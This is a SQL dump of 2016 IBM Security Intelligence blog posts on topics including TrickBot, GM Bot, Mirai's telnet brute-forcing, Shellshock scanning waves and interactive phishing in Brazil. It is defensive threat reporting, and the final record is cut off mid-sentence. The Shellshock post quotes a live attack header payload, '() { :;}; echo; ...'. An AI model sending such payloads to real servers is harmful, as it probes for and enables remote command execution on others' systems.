INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (172, 'Crisis Leadership: The Missing Link in Cyberattack Defense', 'Caleb Barlow', '2016-11-16', 'You are driving in your car with your 10-year-old son in the passenger’s seat. A ball bounces in front of your car and you hit the brakes hard while simultaneously throwing your arm in front of the child, acting almost automatically. That’s called muscle memory, and it is a big part of what organizations need when responding to cyberattacks. When asked how to launch an effective cyberattack defense effort, most people give technology-related answers: Beef up the firewalls, fortify the network, and deploy better   and security analytics solutions. While technology is certainly important, the responses coming from your organization during and following the attack — the human side of the equation — are even more vital. Yet despite a wealth of good advice, I estimate that in 8 of the last 10 large-scale breaches, the response from the organization under attack did as much or more damage than the attack itself. Most of that damage was reputational. Why is that? Very few C-level executives have been trained in crisis leadership. They seldom have to make urgent decisions in near-real time. The usual practice is to build a team around executives to provide input. They carefully study these inputs and weigh them against other information to develop a set of options. Eventually, they fashion a response. This could happen days or weeks later — or, in some cases, not at all. That explains why the   is so often little or no response at all. Often the blame is directed at some vague state-sponsored source when, in reality, the company has no legitimate suspects because attribution is very difficult. That’s when problems arise beyond the actual damage from the breach. Customers worry about their personal information. Suppliers and partners get antsy. Tort lawyers start to circle overhead. Confidence in the organization drops while suspicion mounts. Most all of this post-attack damage is avoidable and unnecessary. First, all organizations must presume that they will fall victim to a major breach at some point. There is no safe harbor, as should be evident to anyone listening to the news these days. Second, the management team needs to undergo in-depth training in crisis management when an attack does happen. This team needs to prepare and rehearse responses for customers, suppliers, regulators, the media and the board. Of the 50 states in the U.S., for example, 47 of them have their own unique breach disclosure laws. You must develop a plan in advance that comply with these laws specific to any states in which you do business. These responses must be ingrained as executive muscle memory. To help IT professionals thoroughly prepare to deal with cyberattacks, IBM opened its  , a simulator designed to train executives in the crisis leadership skills they’ll need to respond to a breach. In the all-day course at the XFCC, teams will first experience a highly realistic, simulated cyberattack. They’ll be exposed to the variety of ways the technical staff tries to detect and stop the attack and then swing into recovery mode. Participants will spend the second half of the day planning the proper response steps and rehearsing them. The central idea is to infuse executives with the confidence and experience of doing something that their MBA training and business experience likely failed to address. Leadership during a cyberattack defense effort requires a full-throttle response in hours, not days or weeks. \n Think back to the  , when criminals tampered with bottles and laced the pain-relieving pills with poison that killed several people. Tylenol’s maker, Johnson & Johnson, immediately removed the product from all store shelves, even though there was no indication of a manufacturing problem. The parent company trusted its brand to survive such a hit, and indeed it did. The company was widely applauded for its leadership in a time of crisis and its near-instant response. Breaches will continue to happen, possibly even at an accelerated pace, given the   all around us and the expanding threat surface that comes with it. The worst thing a company can do in response is what so many end up doing — nothing. Instead, be prepared to meet the crisis with predetermined, definitive responses. Interested in learning more about how IBM’s X-Force Command Centers will help clients stay ahead of the most advanced threats?', '\'C-Suite\', \'Cyberdefense\', \'Data Breach\', \'Incident Response (IR)\', \'Security Leaders\', \'Security Leadership\', \'Security Program\'', 'https://securityintelligence.com/crisis-leadership-the-missing-link-in-cyberattack-defense/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (173, 'Tricks of the Trade: A Deeper Look Into TrickBot’s Machinations', 'Lior Keshet', '2016-11-9', 'TrickBot is a new banking Trojan. It appears to be a Dyre successor that emerged in the wild in October 2016. TrickBot’s code has been in   since August 2016. It continues to see ongoing updates and, now, actual infection campaigns and  . Internally, there is more to   than meets the eye. In this research post, we’ll cover some of the most notable points about this malware’s capabilities, including: For analysis, the sample we used was:  . Nowadays, most modern financial malware families are capable of injecting malicious code into ongoing browser sessions (e.g., MitB or a webinjection attack). The most common way malware developers implement injections is by setting them up locally at the victim’s machine. The malware keeps a local configuration file for the injections, specifying exactly when and how the malware will modify the contents of targeted bank webpages. \n A more advanced and less common method to achieve the same result is to fetch the injection instructions from the attacker’s server in real time. This is the method TrickBot’s developers opted to use. It is also known as serverside injections. For this purpose, and much like other advanced banking Trojans, TrickBot deploys a browser-hooking engine designed to intercept communications to and from the victim’s internet browser. With the real-time fetching trick, the malicious code injections themselves are kept securely on the attacker’s server, not in a file on the victim’s endpoint. When a victim browses one of TrickBot’s target URLs, this is what actually happens: The serverside injection method has advantages over the standard, local mechanism used by most financial malware today. Notably, it allows for enhanced obscurity and flexibility. The malware’s author can keep the injection code out of sight until it is needed. The actor can turn the webinjections on or off on the fly, easily modify the injections and then push an update to some or all the infected victims instantaneously. \n \n \n \n When it comes to keeping malware alive longer, it is common practice for malware authors to add protection layers to their code to ward off reverse engineering. As expected, we identified one such technique employed by TrickBot: API obfuscation. Having analyzed TrickBot’s obfuscation method, we found it very similar to — and likely borrowed from — the Carberp Trojan’s API obfuscation. Carberp’s source code was  , giving rise to other malware based on its sophisticated DNA. We found that TrickBot does not apply the API obfuscation to all the APIs; it only applies it to the more sensitive APIs that the developer wants to be hidden. This is a sneaky method, since researchers may believe they already know all the APIs being used, when in reality more APIs are covertly part of the game. The obfuscation process here is based on precalculated hash values of the APIs. Calling an API function only includes a hash value instead of the function name, making static analysis harder unless the researcher applies an additional method to resolve the APIs. \n \n \n \n A simple way of overcoming this obfuscation is by using an Interactive Disassembler (IDA) Python script, especially since the hashed values themselves are already available within Carberp’s leaked source code. TrickBot has been in testing since summer 2016, even before it was equipped with financial malware features. Initially, TrickBot’s developers appeared to struggle with the malware’s webinjection mechanism, since we found a few TrickBot samples in the wild that presented strangely erratic behavior. At first, we suspected TrickBot was up to some anti-research wiles, but in reality, it was just bugged. Per our analysis, TrickBot’s webinjection malfunction caused the malware to constantly inject the same code over and over again, sabotaging the malware’s own functionality. As this behavior was inconsistent across some samples, we had to manually apply a fix to continue researching the mechanism. We won’t get into further detail at this point, since this bug actually prevented TrickBot from performing fraud. We will say, however, that since the malware is under constant development, the developers may have already addressed the bug and fixed it in the newer samples, enabling TrickBot to operate more smoothly. Speculation over the   emerged as soon as the malware was discovered and has been the source of much debate ever since. Even though this subject was mentioned in several other  , we would like to contribute several key points from our own research into this new threat: \n \n Although the similarities are there, keep in mind that most of them are relatively simply to imitate. For example, even though the serverside webinjection technique is common to both Trojans, the code implementing this capability and the coding style itself are actually different. This point is important because we can see how rapidly and effectively new and advanced malware is being developed, either by the same actors or by newcomers inspired by one of the most nefarious gangs in cybercrime history. TrickBot’s developers must be hard at work these days, pushing to enhance the malware for a live campaign targeting banks. Just as we were about to publish this post, we detected a new infection campaign with a new configuration targeting U.K. banks. Until now, TrickBot only targeted banks in Australia. Furthermore, some of these new U.K. targets are set up for redirection attacks, while TrickBot only employed the serverside webinjection attack described above until now. A redirection attack, in short, means that instead of injecting malicious code into the original webpage, the victim is now redirected to a new site forged by the fraudsters. This site looks and feels exactly like the original website, and the browser indicates a Secure Sockets Layer (SSL) connection based on the original site’s certificate. To learn more about redirection attacks and their purpose, read our blogs about   and  . TrickBot is undoubtedly the work of professionals who have been around the banking Trojan scene for some time. These experienced fraudsters are apparently well-versed in the modern features common to the types of malware banks reckon with nowadays. We expect to see this Trojan evolve its anti-security and anti-research techniques and pop up in more infection campaigns as the year comes to a close.', '\'Advanced Threats\', \'Banking Trojan\', \'Dyre\', \'IBM X-Force Research\', \'Malware\', \'Man-in-the-Browser (MitB)\', \'Man-in-the-Browser (MitB) Malware\', \'TrickBot\', \'X-Force\'', 'https://securityintelligence.com/tricks-of-the-trade-a-deeper-look-into-trickbots-machinations/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (174, 'An Aggressive Launch: TrickBot Trojan Rises With Redirection Attacks in the UK', 'Limor Kessem', '2016-11-8', 'IBM X-Force researchers reported that new banking malware   is now fully operational and able to deploy two of the most advanced browser manipulation techniques: serverside injections and  . While other Trojans like   needed more time to prepare for such attack scenarios, TrickBot has been equipped with both capabilities from day one. The TrickBot Trojan has been in development and testing for the past few months. At first not considered a banking Trojan per se, it became one when it implemented a webinjection mechanism in October 2016. As of early November, X-Force researchers following the malware’s development noted that its operators launched attacks with two new configurations. This officially enabled redirection attacks against four banks in the U.K. An Australia-focused configuration is primarily concerned with serverside injections. Considering its aggressive start, however, X-Force Research expects to see TrickBot expand its target list and attack scope in the coming weeks. During its initial testing infections, TrickBot primarily targeted banks in Australia, along with one Canadian bank and a regular expression (RegEx) URL for a digital banking platform common to regional banks in the U.S. This scope changed almost overnight when TrickBot’s operators launched two new configurations in early November. The malware now targets the personal and business banking websites of financial institutes in the U.K., Australia, New Zealand, Canada and Germany. \n \n More than just adding URLs to the configuration, targeted banks in the U.K. were fitted with customized redirection attacks — the most advanced method to manipulate what victims see in their browsers. The redirections must have been prepared in advance or bought from another gang to push them through on time for the launch of the most recent infection campaigns.\n According to our research, it appears that the gang has been running tests on TrickBot’s infection vectors too. Throughout the small-volume testing, TrickBot dabbled in malvertising  , malicious email attachments purporting to carry a   and, most recently,   coming through the Godzilla loader. These may be TrickBot’s early stages of operation, but judging by these examples, it is evident that its operators are after business accounts. They have been sending malware-laden spam to companies, not just indiscriminate waves of email. TrickBot’s infection methods are bound to change again at any given time, especially considering the malware’s operators are likely connected with other botnets and malware distributors. For example, researchers found that   and that it uses the same crypter as Vawtrak, Pushdo and Cutwail. The Cutwail botnet was, coincidentally, also one of Dyre’s distribution methods during the time it was active. But is coincidence the right word here? According to  , TrickBot was most likely either built by parts of the Dyre team or by someone who values this nefarious project and aims to build a similar beast. TrickBot has been in testing for about two to three months now, and yet its developers have already managed to implement two of the most advanced browser manipulation techniques observed in banking malware in the past few years. TrickBot is moving fast, and we expect to see it amplify infection campaigns and fraud attacks, sharpen its aim on business and corporate accounts, and paint itself into the banking malware picture in the coming months. Indicators of compromise (IOCs) and information on TrickBot are shared and updated on  . We invite you to use the collection and add your input.', '\'Advanced Threats\', \'Banking\', \'Banking Trojan\', \'Dyre\', \'IBM X-Force Research\', \'Malware\', \'TrickBot\', \'X-Force\'', 'https://securityintelligence.com/an-aggressive-launch-trickbot-trojan-rises-with-redirection-attacks-in-the-uk/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (175, 'Consequences of IoT and Telnet: Foresight Is Better Than Hindsight', 'Michelle Alvarez', '2016-11-8', 'Yes, hindsight is often 20/20. But what’s better than hindsight? Foresight. This allows you to prepare for a particular event rather than merely apply the lessons learned from a past cyberattack the next time around. Unfortunately, depending on the significance of the attack, there may not be a next time. For an example of the consequences of Internet of Things (IoT) and Telnet, look no further than the recent record-shattering distributed denial-of-service (DDoS) attack against domain name provider Dyn, which used the Mirai IoT botnet. In the report titled “ ,” IBM warned that one of the oldest protocols for accessing remote computers, Telnet, could enable attackers to   without authorization. Then, in September, a large DDoS attack targeted popular security news site KrebsOnSecurity. Initial reports indicated that an IoT botnet could have been involved. When the source code for the known  , we figured it would only be a matter of time before cybercriminals found a way to capitalize on its use of the IoT and Telnet to take down websites via a DDoS attack. On Friday, Oct. 21, Dyn fell victim to  . The attack disrupted internet access across the U.S. to major sites including Twitter, Netflix and Amazon. The attack most likely used tens of millions of webcams, home automation devices, wireless routers and internet-enabled appliances. Because these devices usually come with factory-supplied passwords that consumers typically do not change, they are easy to infect. Telnet does not encrypt communications, enabling attackers to access user IDs and passwords. According to  , the Mirai command-and-control (C&C) server leveraged the Telnet service to acquire bots using a scanner that can quickly identify any device listening on TCP port 23. There have also been reports of  , which is officially registered by the Internet Assigned Numbers Authority (IANA) for 3d-nfsd. Inside the source code is a file called scanner.c, which the bot uses to perform brute-force scanning of a select set of IP ranges. This allows the bot to find additional hosts it can acquire by initiating a discovery scan against it. Once the scanner finds an open Telnet port, it performs a dictionary-based brute-force attack against the host. The scanner also checks to see if it can directly connect to Telnet with default credentials. Once access is established, the bot verifies the login to the new device. When properly authenticated, the host then reports its IP address, port and authentication credentials back to the C&C. Once a target is compromised, it is then fed further instructions to execute a DDoS attack. The device continues to perform its normal functions while it perpetrates the attack.  data revealed a very interesting trend emerging over the last several months regarding the number of IP addresses attempting to either access or determine if the Telnet port is running. There was notable rise from May through July, and then the numbers jumped significantly from July to August — almost a 140 percent increase. Levels have remained relatively high through October. There are a number of potential reasons for this increase. Certainly, Mirai played a role. However, not all the source IPs were associated with this particular botnet. When we analyzed IBM MSS security event data for  , Telnet accounted for more than three-quarters of the sweep traffic. Clearly, attackers are looking for open Telnet ports. An attacker may do this as part of an effort to: In other words, there are many bad actors out there who are interested in using Telnet to achieve their malicious goals. While Telnet is no longer enabled by default in as many UNIX/Linux distributions as it once was, it still gets triggered by inexperienced administrators and can be enabled by default on many IoT devices. Additionally, some Telnet servers connected to the internet are running on systems ranging from Windows 10 all the way back to Windows XP. Organizations should limit the use of Telnet in their IT environments. Disable Telnet if it is not necessary or replace it with a stronger counterpart, such as Secure Shell (SSH). To remediate DDoS attacks, IT professionals must detect unusually high volumes of requests made by the internet-enabled devices and temporarily shut down access to them. Additionally, enterprises security teams should: Organizations must respond proactively to minimize damage. An   is the single most important factor in reducing the cost of a data breach. Meanwhile, a   can divert traffic from your environment during a DDoS attack, enabling your web properties to function normally. Finally, continue to   information to gain foresight on threats to your environment.', '\'Advanced Threats\', \'Cyberattack\', \'Cybercrime\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'IBM Managed Security Services (MSS)\', \'Internet of Things (IoT)\', \'X-Force\'', 'https://securityintelligence.com/consequences-of-iot-and-telnet-foresight-is-better-than-hindsight/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (176, 'Track Relevant Vulnerabilities With Watchlists', 'Security Intelligence Staff', '2016-11-1', 'Imagine you are a network administrator in a company. You know what software is used in your environment, including what specific versions are deployed. Maintaining an accurate asset inventory is a key step in incident response planning. Likewise, maintaining timely patching practices is important to protect against common attack vectors.  estimated that 90 percent of exploits leverage vulnerabilities for which a patch has been available but not yet applied. But how can you track relevant vulnerabilities for your enterprise IT assets? Until now, tracking vulnerabilities was a tedious task. The volume of incoming vulnerabilities needs to be matched against your own enterprise asset inventory to track those interesting to you and your environment. This is a massive task:   logged nearly 9,000 new vulnerabilities in 2015. The IBM X-Force Exchange collaborative threat intelligence platform offers a new way to track relevant vulnerabilities. Within the platform, you can research indicators of compromise, conduct security investigations and watch for vulnerabilities on target technologies in your infrastructure just by maintaining a list of keywords or products to monitor. If new vulnerabilities are disclosed that match keywords or products on your watchlist, you will be automatically notified. To use the watchlist feature, log into   with your IBM ID. Then open up the user panel by clicking on the icon in the upper-right corner. Go to Settings at the bottom of this panel. On the settings page, select the Watchlist option on the left side. In the input field, you can enter a product name that you want to watch or select existing or known products from the menu. The search feature will make suggestions as you start typing the product name. Items will get added to a list below. If you want to delete items from the list, you can do so by hovering over the item and clicking the delete icon on the right hand side. The watchlist keywords enable you to track, for example, “Linux” as a general term, or terms as specific as “Linux Kernel” or “Linux Kernel 3.9, rc7.” This flexibility allows you to tailor your watchlist to vulnerabilities that can truly affect your enterprise security rather than a   that may not necessarily apply to your organization. Once you finish creating your watchlist, you’ll be alerted of any new vulnerability that matches the items you selected in the notification center in the X-Force Exchange. Check the upper-right corner of the window when logged into the platform. You can also opt for email notifications to monitor these vulnerabilities. \n To help take action on these vulnerabilities or scrutinize them in your network, you can add them to a Collection in the X-Force Exchange and import it into your security information and event management (SIEM), either via the   or using STIX/TAXII protocols. You can generate credentials for the X-Force Exchange API from within the same user settings area on the platform. As part of our agile development cycle, new capabilities are added frequently, highlighted in the notifications areas on the platform. To learn more about other ways X-Force Exchange can help solve security problems and protect your network, watch our on-demand webinar, “ .”', '\'IBM X-Force Exchange\', \'Patch Management\', \'Vulnerabilities\', \'Vulnerability Management\', \'X-Force\', \'X-Force Features\'', 'https://securityintelligence.com/track-relevant-vulnerabilities-watchlists/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (177, 'GM Bot: Alive and Upgraded, Now on Android M', 'Limor Kessem', '2016-10-24', 'detected a recently updated version of the GM Bot mobile banking malware designed to deploy on Android 6 operating systems and bypass new security applied to the platform. Android officially released this Marshmallow OS, code-named M, in October 2015. The GM Bot version we analyzed can work on all Android versions up to the Marshmallow distribution. This new finding is notable since GM Bot’s developer was banned in underground boards where he used to sell the malware. A   that the original developer has stopped selling it. However, it’s now obvious that GM Bot is still alive and continuously updated to circumvent Android security. Attackers have been actively using the new version in the wild. Overlay Trojans, such as GM Bot and  , are designed to superimpose fraudulent message windows on top of banking and payment applications to phish credentials, credit card information and other personally identifiable information (PII). GM Bot’s spyware features also empower remote attackers to access transaction authorization codes sent via short message service (SMS), view device information, intercept, forward or initiate phone calls, or lock the device’s screen. Overlay malware is ultimately a cybercriminal’s way to gather victims’ online banking credentials and authentication factors all on one device. In general terms, the overlay scheme works when the malware can: The first task is often achieved by abusing Android getRunningTasks() application program interface (API). The option was deprecated starting with the Android Lollipop release, thus temporarily hampering the ability of overlay Trojans to figure out what the user is looking at. Of course, cybercriminals operating Trojans of this type are not going to wait to find the next fix. Malware developers tried a variety of tricks to get past the new deprecation block, including: GM Bot’s developer, known as GanjaMan, also found a way to bypass the deprecation block and implemented it in the most recent version of the malware. In this case, the developer did not go far into programming genius. Rather, he used an open-source method   and began implementing a process enumeration to find out which app was running in the foreground — a good, heuristic way to figure it out. \n In the screen capture below, we can see GM Bot calling on four functions. Next, it will choose how to get the foreground app, depending on the Android version running on the infected device: The updated GM Bot is able to fetch the enumeration trick to get information on the app running in the foreground: With that information available to guide it, GM Bot can once again fetch a matching fake overlay to present to the victim, even on devices running Android M. GM Bot is one of the best-known commercialized mobile malware codes in the overlay category. It first surfaced in October 2014 in underground discussion boards. The developer sold it continually to fraudsters until a GM Bot customer   in February 2016. The leak was apparently of no consequence to the developer, who promptly   of the malware later that month. In his post, he indicated that the new version was the fruit of six months’ work, since he had rewritten he malware “from scratch.” He also claimed to have incorporated three different Android OS exploits for infecting user devices, thus tripling the original price of a GM Bot kit from $5,000 to $15,000. But code development and customer service are two distinct art forms. Soon after the second release, GanjaMan was banned from the forums on which he sold his malware as a result of a customer dispute. Since then, GM Bot was believed to have vanished, but we did not expect the author to abandon his misdeeds altogether due to a mere forum ban. Details on the GM Bot sample we analyzed appear below: For more information on how to protect your Android-based device from malware like GM Bot, refer to these helpful  .', '\'Android\', \'Android Security\', \'Banking Trojan\', \'GM Bot\', \'IBM X-Force Research\', \'Malware\', \'Mobile Malware\', \'Mobile Security\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/gm-bot-alive-upgraded-now-android-m/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (178, 'Researchers Detect Second Wave of Shellshock Attacks Since Two-Year Anniversary', 'Michelle Alvarez', '2016-10-21', 'Beginning on Oct. 10, 2016, IBM X-Force detected a notable increase in Shellshock activity lasting four days. Given its prevalence over the last two years, we didn’t think we had seen the last of Shellshock. We are a little surprised, however, by its latest uptick in activity. This spike saw nearly the same volume of Shellshock attacks as the one we observed prior to   last month. The attacks in this latest wave, however, were sourced from only four U.S.-based IP addresses, whereas the previous spike in Shellshock activity originated from hundreds of unique IP addresses. Just as quickly as they appeared, the attacks evaporated as of Oct. 14, 2016. As with September’s attacks, this more recent wave was designed to perform reconnaissance against distributed targets to find machines vulnerable to Shellshock. Targets were not concentrated in any specific geography — this was a global campaign spanning multiple industries. The campaign — currently rated 10, indicating the highest level of risk — used the following four IP addresses: The attack’s payload contained the following information: :header_value=() { :;}; echo; echo “”39319c2bd3231f5c4a15e142faef5bf2″” Unlike the September attacks, which used the Session Initiation Protocol (SIP) to determine exploitability, the October attacks used a unique identifier that looks suspiciously like an MD5 checksum, but it is not. Each individual attack thread is assigned a unique string that identifies the target as vulnerable to the Shellshock exploit. Exploitation is possible when the attacker sees the unique identifier echoed back into the attack tool. For more information about the October wave of Shellshock attacks, see the  . This may sound like a broken record by now, but if you have not patched your systems against this threat, we strongly advise doing so as soon as practical. The IBM X-Force Exchange   contains an extensive list of references. This should provide you with the information you need to obtain the appropriate patches. Protocol analysis can provide another layer of security against these attacks. Because the aforementioned IPs are registered to what appears to be a cloud provider, I’d be remiss if I didn’t point out the potential risks associated with cloud services. Companies must consider the risks of misuse of employee credentials, hijacked accounts and insecure interfaces or application program interfaces (API) when deciding whether to adopt a cloud solution. Security should be at the heart of any organization’s   and design.', '\'Advanced Threats\', \'IBM X-Force Research\', \'Malware\', \'Shellshock\', \'X-Force\'', 'https://securityintelligence.com/researchers-detect-second-wave-shellshock-attacks-since-two-year-anniversary/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (179, 'Insider Threats, Industrial Sabotage and Game Theory: Part 2', 'Kelly Ryver', '2016-10-20', 'Before we continue to examine two-player games and provide a bit more insight on the game theory principles of collusion, cooperation and defection, let’s briefly return to the simple game theory model used in economics. Cooperation agreements alter the simple game theory model slightly: The terms party, player and insider threat represent any employee, contingent worker, contractor, subcontractor, union, manager, executive, shareholder, venture capitalist, investment backer, investment firm or external cybercriminal. The cooperative model applies when two   agree to work together in pursuit of a common objective. This kind of cooperation does not necessarily imply a literal agreement that both parties sign. Rather, it is simply an understanding between the two parties that they share a common goal — control of one or more parts of the industrial environment they are targeting. Cooperation between insider threats can have far-reaching consequences, including: When either party begins to put his or her own interests ahead of the other’s, the second phase of game theory begins. When two insider threats collude to target an environment, the parties usually start out cooperating but begin to conspire against each other over time as each party develops individual goals. Colluding insider threats can result in a slew of problems, including: The third phase of game theory kicks in when either party A or party B decides he or she will no longer collude with the other. Understanding defection is not quite so simple. How often the players of the game defect is determined by the type of game. For example, if the game is linear or continuous, such as long-term industrial sabotage, the parties can defect as many times as necessary to reach their goal of controlling the environment. If it’s a single game, a party can defect only once. In industrial environments, a single game would have an ultimate goal of destroying the environment to the extent that recovery is impossible. Insider threats that defect during a continuous game of industrial sabotage can trigger a variety of issues, including: Insider threats that defect during a single game of industrial sabotage introduce a different set of problems: In continuous games, defection is not the final phase of the game — the insider threat will simply start the game over by cooperating or colluding once again. In a single-instance game, defection is the end state, since one or both insider threats aim for complete destruction of the target environment. Unfortunately, game theory is extremely difficult to detect in any form, even for the most rigorously secured industrial environments. Security tools that employ behavioral analysis, pattern recognition, predictive analytics and cognitive capabilities enable industrial organizations to bolster their defensive capabilities. For offensive capability, the industrial environment should   whose members understand the basic principles of game theory. Industrial environments that do not have the in-house expertise can purchase   from a handful of security services firms that offer them.', '\'Information Security\', \'Insider Threat\', \'Risk\', \'Risk Management\', \'Security Leadership\'', 'https://securityintelligence.com/insider-threats-industrial-sabotage-game-theory-part-2/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (180, 'Behavior Analytics: The Right Ingredient to Combat Insider Threats', 'Pamela Cobb', '2016-10-19', 'In the salad days of internet security, we were faced with threats like SQL Slammer and the ILOVEYOU virus. In those instances, the attacker was obvious and the fix was relatively simple, especially compared to today’s advanced attacks. The indiscretions of youthful security could be counteracted with antivirus solutions without the complicated algorithms behind security intelligence and forensics. Today, since threats often come from inside our own networks, an   solution is an essential ingredient for any cybersecurity pantry. Organizations frequently conduct investigations on security incidents with limited context. A major problem is that these incidents are accompanied by either few breadcrumbs to follow or several loaves worth of croutons strewn about the network. It’s important to use a solution that reduces the time and resources required to diagnose and respond to an attack. To further complicate matters, many of these attacks are attributed to legitimate credentials on the network. The second layer of defense is the ability to detect advanced attacks that evade real-time defenses using these valid credentials. Enter user behavior analytics. Niara’s user and network entity behavior analytics solution deploys supervised and unsupervised   models running on a Spark/Hadoop platform to spot small, telltale changes in user or system behavior. These breadcrumbs can be indications of a gestating attack, in which case Niara can automatically aggregate and summarize the forensic data necessary for triage and response with a  . This technique worked at a legal firm, where Niara analyzed authentication and activity patterns to detect instances of password sharing among employees. Niara uses more than 100 machine learning models that provide a unified view of all IT activity, including packets and flows, logs and alerts, and  . With an enterprise scale that can monitor over 100,000 entities for abnormal behavior, Niara seamlessly integrates with the IBM QRadar console, analytics and workflow. This workflow integration is particularly key for supporting forensic data analysis and alert triage. One organization saved an average of   by using the forensic information within Niara’s solution. Between Niara and QRadar, full visibility across the IT ecosystem means no blind spots in the machine language coverage and attack detection. The seamless integration of the attack alert, a full description of the behavior analytics and supporting information means that incident response is reduced from hours and days to minutes with just a few clicks to get down to the packet level. For one financial services client, Niara leveraged behavioral techniques to analyze activity data for employees. It detected two employees trying to exfiltrate data to Dropbox in violation of corporate security policy. For a high-tech customer, Niara machine learning identified a small change intended to spoof a sender’s email address (for example, N1ara.com versus Niara.com) to detect a targeted  . Whaling is a particular type of phishing email typically targeting the financial department of a company. It appears to come from a high-level executive, likely a CEO or CFO, looking for an immediate transfer of funds. But the real destination for the funds is the attacker’s bank account. Domain spoofing, a technique that causes the source of the malicious message to appear legitimate, is the most popular strategy in whaling. Visit the   to try Niara’s integration with QRadar for yourself. You can also learn more about Niara’s user and network behavior analytics solution in the upcoming webinar “ ,” scheduled for Nov. 8, 2016.', '\'Analytics\', \'Behavioral Analytics\', \'IBM Security App Exchange\', \'IBM Security QRadar\', \'IBM X-Force Exchange\', \'Security Analytics\', \'X-Force\'', 'https://securityintelligence.com/behavior-analytics-right-ingredient-combat-insider-threats/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (181, 'Reduce the Noise of Threat Intelligence', 'Chris Meenan', '2016-10-19', 'Threat intelligence feeds have gained a lot of popularity over the last few years. Born of IP watch lists provided by a handful of organizations, they have emerged to become a significant part of a mature security intelligence program. Now instead of just IP addresses, most feeds include information on file names and hashes, URLs, users and more. All this can come together to deliver more information to analysts about everything crossing their wires. Why is this incremental threat intelligence information so important? In a word, context — and the difference between noise and context is security analytics. The acceptance of   over the past dozen years allows analysts to correlate and manage the security data on their networks, include external data elements and view it all in one place. The Trusted Automated Exchange of Indicator Information (TAXII) and Structured Threat Information Expression (STIX) are sets of   that have simplified the process of adding threat intelligence to  . Security teams can better protect their environments by incorporating information on threats observed in the wild. Threat intelligence helps by identifying things that are out of place. This information can be useful, but not if it’s simply dumped in. There is still noise, and threat feeds will sometimes even increase the amount depending on how they’re used. The credibility and confidence of the sources is also very important. Free feeds might not have the most accurate information, whereas commercial feeds might seem to tag almost everything as a threat at some point or another. When refining your use of  , you must look at it the same way you look at all other information on your network. Don’t just turn everything on and hope for the best. Identify what you are trying to discover and what areas are most important to your organization. If you look at two separate areas of the network, for example, you’ll need different levels of focus depending on the role of that area. \n Even on a good day, your exclusive perimeter network, or demilitarized zone (DMZ), and other public areas produce a lot of noise. You can use information from threat intelligence feeds to help identify potentially bad traffic at the perimeter. But just throwing in all the intelligence data may drown your team in incidents. It’s better to focus on the worst or most persistent set of indicators to reduce the number of incidents to a manageable level. If, however, you’re dealing with a more secure network area, such as a database server farm, where only very specific traffic should be present, you can be more liberal with the threat indicators in both volume and quality. These servers typically hold business-critical data, so don’t take any chances. Opening up the threat intelligence data allows you to cast a wider net that would drown you in a more public-facing network segment. Other good use cases involve applying threat intelligence to  . When probable cause directs you to investigate hosts or users, threat intelligence can help determine who or what they might have been exposed to in the past. The added context that threat intelligence feeds provide is very important to protecting your networks. By using the confidence levels of that information and carefully implementing different uses around your network, you can better protect yourself without overloading your security analysts with too much noise.', '\'Security Analytics\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Threat Intelligence\'', 'https://securityintelligence.com/reduce-noise-threat-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (182, 'New, Live, Interactive Phishing Attacks Emerge in Brazil', 'Limor Kessem', '2016-10-3', 'Brazil is fighting an uphill battle when it comes to cybercrime. There’s a new fraud attempt every 16.9 seconds in Brazil,   reported. According to  , there are about 4,700 attempts per day. No wonder internet fraud has been named the “ ” of Brazil. IBM X-Force continues to discover evolving cybercrime threats and new tactics in the country. X-Force researchers uncovered and analyzed a new phishing method that recently emerged in Brazil. This particular method is designed to emulate a banking Trojan by extracting critical data from its victims in real time via a live, interactive phishing attack. This type of phishing scheme takes place over a web session between the attacker and the victim. It is able to mimic a target website’s look and feel, more so than just an idle phishing page. From afar and behind the scenes, cybercriminals impersonate the victim’s bank and ask for all kinds of account details. Most likely, the criminal will access the compromised account from the bank’s website to make a transaction in real time, all the while milking more authentication details from the unsuspecting victim. The emergence of this new method’s will likely contribute to rises in fraud in Brazil over the coming months. Brazil is already the second-largest generator of cybercrime in the world, according to  , and the country most affected by fraud in Latin America, per  . For some perspective, one of cybercrime’s most targeted countries in the world, the U.K., saw a 25 percent increase in online fraud in 2015, as reported by  . Brazil saw a 40 percent rise in online banking fraud, according to  , during the same year. Phishing fraudsters have devised numerous tactics to solicit the attention of  . They may send emails impersonating the bank, redirect users to fake sites, deploy pharming attacks, induce malicious proxy changes, or launch fake windows or images on the victim’s desktop to rob access credentials, account information, card data and personally identifiable information (PII). Most banks require users to provide personal details in real time to authenticate customers during digital transactions. This usually foils fraud attacks. These details are called out-of-band authentication because they happen away from the user’s browser, via a smartphone, card reader or numeric code chart. So how does a criminal rob an SMS code without infecting the victim’s smartphone? How does he or she gain real-time access to a time-based code issued by the bank for a given transaction? Well, they typically can’t. But you can appreciate how much they would want this type of access. Enter interactive phishing, a real-time web session that dupes users with a seamless flow of changing screens and messages controlled by the attacker from a remote server. Using this type of interactive attack, criminals can better impersonate the victim’s trusted bank or service provider. Furthermore, with information being delivered from the victim according to the attacker’s request in real time, the chances of success are much higher. This threat is considered advanced and high risk due to its credibility factor. \n Like other cybercrime-related domains, the interactive phishing attack is hosted on a domain the attacker registers. But unlike regular phishing pages, it is a live web session attackers control and can personalize at their discretion. A victim receives a phishing email containing a link. After clicking it, the victim lands on the attacker’s page, which looks like the 